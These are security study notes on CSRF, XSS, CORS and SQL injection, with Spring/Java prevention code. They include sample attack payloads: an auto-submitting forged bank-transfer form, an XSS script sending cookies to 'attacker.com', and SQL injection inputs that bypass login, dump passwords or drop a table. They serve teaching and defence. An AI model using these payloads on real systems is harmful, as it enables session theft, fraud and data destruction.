# Security Attacks - Detailed Notes

## 1. CSRF (Cross-Site Request Forgery)

### What is CSRF?
CSRF is an attack that forces an authenticated user to execute unwanted actions on a web application where they're currently authenticated.

### How CSRF Works
```
1. User logs into bank.com (gets session cookie)
2. User visits malicious.com (while still logged in)
3. malicious.com contains: <form action="bank.com/transfer" method="POST">
4. Form auto-submits, browser sends cookie to bank.com
5. Bank processes the request (thinks it's legitimate)
```

### Example Attack
```html
<!-- Malicious website -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="10000"/>
  <input type="hidden" name="to" value="attacker-account"/>
</form>
<script>document.forms[0].submit();</script>
```

### Prevention Techniques
1. **CSRF Tokens**: Unique token per session/request
2. **SameSite Cookies**: `SameSite=Strict` or `SameSite=Lax`
3. **Double Submit Cookie**: Token in cookie + request parameter
4. **Custom Headers**: X-Requested-With header

### Spring Security Protection
```java
// Enabled by default in Spring Security
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        http.csrf(csrf -> csrf.csrfTokenRepository(
            CookieCsrfTokenRepository.withHttpOnlyFalse()
        ));
        return http.build();
    }
}
```

---

## 2. XSS (Cross-Site Scripting)

### What is XSS?
XSS allows attackers to inject malicious scripts into web pages viewed by other users.

### Types of XSS

#### A. Stored XSS (Persistent)
- Malicious script stored in database
- Executed when data is retrieved and displayed

```javascript
// Attacker submits comment:
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>

// When other users view comments, script executes
```

#### B. Reflected XSS (Non-Persistent)
- Script in URL/request parameter
- Reflected back in response

```
https://example.com/search?q=<script>alert('XSS')</script>

// If server displays: "Results for: <script>alert('XSS')</script>"
```

#### C. DOM-Based XSS
- Vulnerability in client-side JavaScript

```javascript
// Vulnerable code:
let search = window.location.hash.substring(1);
document.getElementById('results').innerHTML = search;

// Attack URL:
https://example.com#<img src=x onerror=alert('XSS')>
```

### Prevention Techniques

1. **Output Encoding**
```java
// HTML Entity Encoding
< becomes &lt;
> becomes &gt;
" becomes &quot;
' becomes &#x27;
```

2. **Input Validation**
```java
@Pattern(regexp = "^[a-zA-Z0-9 ]*$")
private String username;
```

3. **Content Security Policy (CSP)**
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

4. **Use Templating Engines**
```html
<!-- Thymeleaf auto-escapes -->
<p th:text="${userInput}"></p>
```

---

## 3. CORS (Cross-Origin Resource Sharing)

### What is CORS?
CORS is a security mechanism that controls how web pages from one domain can access resources from another domain.

### Same-Origin Policy (SOP)
Browser security feature that restricts cross-origin requests.

**Same Origin**: Same protocol + domain + port
```
https://example.com:443/page1
https://example.com:443/page2  ✓ Same origin

https://example.com:443/page1
http://example.com:443/page1   ✗ Different protocol
https://api.example.com:443     ✗ Different subdomain
https://example.com:8080        ✗ Different port
```

### How CORS Works

#### Simple Request
```http
GET /api/data HTTP/1.1
Origin: https://frontend.com

Response:
Access-Control-Allow-Origin: https://frontend.com
```

#### Preflight Request (for complex requests)
```http
OPTIONS /api/data HTTP/1.1
Origin: https://frontend.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type

Response:
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Methods: POST, GET
Access-Control-Allow-Headers: Content-Type
Access-Control-Max-Age: 3600
```

### CORS Configuration in Spring

```java
@Configuration
public class CorsConfig {
    
    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/api/**")
                    .allowedOrigins("https://frontend.com")
                    .allowedMethods("GET", "POST", "PUT", "DELETE")
                    .allowedHeaders("*")
                    .allowCredentials(true)
                    .maxAge(3600);
            }
        };
    }
}

// Or with Spring Security
http.cors(cors -> cors.configurationSource(request -> {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(Arrays.asList("https://frontend.com"));
    config.setAllowedMethods(Arrays.asList("GET", "POST"));
    return config;
}));
```

### CORS Security Risks
```java
// ❌ DANGEROUS - Allows all origins
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

// ✓ SAFE - Specific origins
Access-Control-Allow-Origin: https://trusted-site.com
```

---

## 4. SQL Injection

### What is SQL Injection?
SQL Injection is an attack where malicious SQL code is inserted into application queries.

### How SQL Injection Works

#### Example 1: Authentication Bypass
```java
// Vulnerable code
String query = "SELECT * FROM users WHERE username='" + username + 
               "' AND password='" + password + "'";

// Attack input:
username: admin' --
password: anything

// Resulting query:
SELECT * FROM users WHERE username='admin' -- ' AND password='anything'
// Everything after -- is commented out!
```

#### Example 2: Data Extraction
```java
// Vulnerable code
String query = "SELECT * FROM products WHERE id=" + productId;

// Attack input:
productId: 1 UNION SELECT username, password FROM users

// Resulting query:
SELECT * FROM products WHERE id=1 UNION SELECT username, password FROM users
```

#### Example 3: Data Modification
```java
// Attack input:
productId: 1; DROP TABLE users; --

// Resulting query:
SELECT * FROM products WHERE id=1; DROP TABLE users; --
```

### Prevention Techniques

#### 1. Prepared Statements (Parameterized Queries)
```java
// ✓ SAFE - Using PreparedStatement
String query = "SELECT * FROM users WHERE username=? AND password=?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

#### 2. JPA/Hibernate with Named Parameters
```java
// ✓ SAFE - JPA Query
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);

// ✓ SAFE - Criteria API
CriteriaBuilder cb = em.getCriteriaBuilder();
CriteriaQuery<User> query = cb.createQuery(User.class);
Root<User> user = query.from(User.class);
query.select(user).where(cb.equal(user.get("username"), username));
```

#### 3. Input Validation
```java
@Pattern(regexp = "^[a-zA-Z0-9_]{3,20}$", message = "Invalid username")
private String username;

// Whitelist validation
if (!username.matches("^[a-zA-Z0-9_]+$")) {
    throw new IllegalArgumentException("Invalid input");
}
```

#### 4. Stored Procedures
```java
CallableStatement stmt = connection.prepareCall("{call getUserByUsername(?)}");
stmt.setString(1, username);
ResultSet rs = stmt.executeQuery();
```

#### 5. ORM Frameworks
```java
// ✓ SAFE - Spring Data JPA
public interface UserRepository extends JpaRepository<User, Long> {
    User findByUsername(String username);
}
```

### Additional Security Measures

1. **Least Privilege**: Database user with minimal permissions
2. **Escaping**: Escape special characters (last resort)
3. **WAF**: Web Application Firewall
4. **Error Handling**: Don't expose database errors

```java
// ❌ BAD - Exposes database structure
catch (SQLException e) {
    return "Error: " + e.getMessage();
}

// ✓ GOOD - Generic error message
catch (SQLException e) {
    logger.error("Database error", e);
    return "An error occurred. Please try again.";
}
```

---

## Summary Table

| Attack | Target | Impact | Primary Defense |
|--------|--------|--------|-----------------|
| **CSRF** | Authenticated users | Unauthorized actions | CSRF tokens |
| **XSS** | Application users | Script execution, data theft | Output encoding, CSP |
| **CORS** | API endpoints | Unauthorized access | Proper CORS configuration |
| **SQL Injection** | Database | Data breach, manipulation | Prepared statements |

## Key Takeaways

1. **Defense in Depth**: Use multiple security layers
2. **Never Trust User Input**: Always validate and sanitize
3. **Use Framework Features**: Spring Security provides built-in protection
4. **Keep Updated**: Regularly update dependencies
5. **Security Testing**: Include security tests in CI/CD pipeline
